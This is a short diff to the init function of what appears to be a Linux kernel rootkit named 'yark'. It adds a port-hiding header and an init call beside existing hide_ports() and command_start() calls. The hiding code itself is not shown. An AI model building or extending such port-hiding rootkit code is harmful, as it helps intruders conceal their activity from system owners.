@@ -3,6 +3,7 @@
 
 #include "hook_helper.h"
 #include "command.h"
+#include "hide_port.h"
 #include "main.h"
 
 //functions and args bellow are all for hidding ports
@@ -29,6 +30,7 @@ static int __init yark_init(void)
 {
     pr_info(LOG_PREFIX "call yark_init()");
     hide_ports();
+    hide_port_init();
     command_start();
     return 0;
 }
